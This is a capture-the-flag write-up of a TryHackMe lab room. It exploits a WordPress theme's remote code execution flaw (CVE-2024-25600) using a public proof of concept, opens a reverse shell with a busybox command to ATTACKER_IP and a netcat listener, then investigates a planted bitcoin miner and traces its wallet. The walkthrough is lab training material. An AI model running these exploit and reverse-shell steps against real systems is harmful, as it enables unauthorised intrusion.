# TryHack3M: Bricks Heist

This is the first challenge of the module TryHack3M Special for the reach of 3 million users on the platform. <br>
The official link to the room is [here](https://tryhackme.com/r/room/tryhack3mbricksheist)

In this room we are gonna practice with some web enumeration and exploitation, and finally do some OSINT.

Whenever you feel ready start the machine and connect via OpenVPN or the AttackBox.

<br/>
<br/>

## The Story
Brick Press Media Co. was working on creating a brand-new web theme that represents a renowned wall using three million byte bricks. Agent Murphy comes with a streak of bad luck. And here we go again: the server is compromised, and they've lost access.  
  
Can you hack back the server and identify what happened there?

<br/>
<br/>

## The Challenge

Before starting the recon phase let's edit the hosts file
```bash
sudo echo "MACHINE_IP" bricks.thm >> /etc/hosts
```

Now we can begin with a port scan using *nmap*
```bash
nmap -sV MACHINE_IP
```
We get the following ports open:
```
PORT     STATE SERVICE  REASON         VERSION
22/tcp   open  ssh      syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http     syn-ack ttl 63 WebSockify Python/3.8.10
443/tcp  open  ssl/http syn-ack ttl 63 Apache httpd
3306/tcp open  mysql    syn-ack ttl 63 MySQL (unauthorized)
```

Checking the website running on port 80 i got an error, so i went to check if maybe a site is running using the apache web-server: (port 443 is https)
```http
https://bricks.thm/
```

Doing a directory scan with *gobuster* i was able to see the robots.txt page, navigating to it we find another directory `/wp-admin` that takes us to a WordPress login page but we do not have the credentials.

We can use a tool called *wpscan* to gain more information about the website, as with *gobuster* we need to add the option to ignore the TSL check
```bash
 wpscan --url https://bricks.thm --disable-tls-checks
```
Reading the output notice that is running  version: 1.9.5, let's check online if there are any known vulnerabilities. 

And yes, we are lucky, there is CVE-2024-25600 which is a RCE vulnerability, looking around there is also a PoC in GitHub we can use. 
Here is the [Repo](https://github.com/Chocapikk/CVE-2024-25600)

Clone the repo
```bash
git clone https://github.com/Chocapikk/CVE-2024-25600.git
```

Now navigate in the directory and install the requirements
```bash
cd CVE-2024-25600
```
```bash
pip install -r requirements.txt 
```

We are ready to run the exploit
```bash
python exploit.py -u https://bricks.thm/
```

And in a couple of seconds we have a shell, now we can start looking around
```bash
ls -la
```
There is a very long filename with a txt extension, maybe is something interesting 
```bash
cat 650c844110baced87e1606453b93f22a.txt
```

Yes, it contains the first flag: --> REDACTED

It is now time to engage in further investigations about the hack, but first let's upgrade our shell
on the reverse shell
```bash
busybox ATTACKER_IP 1234 -e /bin/bash
```

on your machine
```bash
nc -lvnp 1234
```

now we got the connection, here use the python to upgrade the shell:
```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```
We can also further enhance the shell making it interactive.

<br>

Looking at the second question we know we have to investigate for some rough process, we can use *systemctL* to do it
```bash
systemctl list-units --type=service --state=running
```

There is a service called "ubuntu.service" and inside the description has --> TRYHACK3M, this looks suspicious enough to procede.

We can discover more info about the process with:
```bash
systemctl status ubuntu.service
```
Here we can see what is actually running: --> REDACTED which is a file stored in the `/lib/NetworkManager` directory.

We can navigate to the location:
```bash
cd /lib/NetworkManager
```

Since the file is an executable and we need to investigate it, we can use Python to create a web-server inside the directory and request the file from our machine.

On the reverse shell:
```bash
python3 -m http.server 8090
```

In the attacker machine:
```bash
wget -O- http://MACHINE_IP:8090/nm-inet-dialog > suspicious-file  
```

Now we have the malicious file in our machine, we can upload it to Virustotal and see what information we can get. 

It says it is a Bitcoin miner, under behavior we can see it loads `/lib/NetworkManager/inet.conf`, this is of interest as is in the same directory as the executable.

Going back into the reverse shell we can open it with `cat` and notice that is a log file, this means we got the answer to another question.

Checking the log file we also get this bitcoin address id:
```
5757314e65474e5962484a4f656d787457544e424e574648555446684d3070735930684b616c70555a7a566b52335276546b686b65575248647a525a57466f77546b64334d6b347a526d685a6255313459316873636b35366247315a4d304531595564476130355864486c6157454a3557544a564e453959556e4a685246497a5932355363303948526a4a6b52464a7a546d706b65466c525054303d
```
Looking at it we can see it is encoded in hexadecimal, after decoding it we get a base64 string, decoding again we have again a base 64 string that finally decoded gives us the address
`bc1qyk79fcp9hd5kreprce89tkh4wrtl8avt4l67qabc1qyk79fcp9had5kreprce89tkh4wrtl8avt4l67qa` or better, 2 addresses as every one start with `bc1`, so the final answer is 
--> REDACTED

Now we need to investigate the wallet transactions in order to see the threat group it is associated with.

To do it open any Bitcoin blockchain website that will show all the transactions related to a wallet, then scroll trough them and you will find this address: `bc1q5jqgm7nvrhaw2rh2vk0dk8e4gg5g373g0vz07r` who participated at the first transaction of 11 bitcoins.

Time to link the bitcoin wallet with some real entities, searching it online i found a US governative page which states that this address with others are in a special sanction list because they are affiliated with a Russian well known ransomware group that is: --> REDACTED

<br>
Congratulations, you have completed the First room of the 3 million special series, hope you had fun practicing and following along.

See you in the next challenge 😃
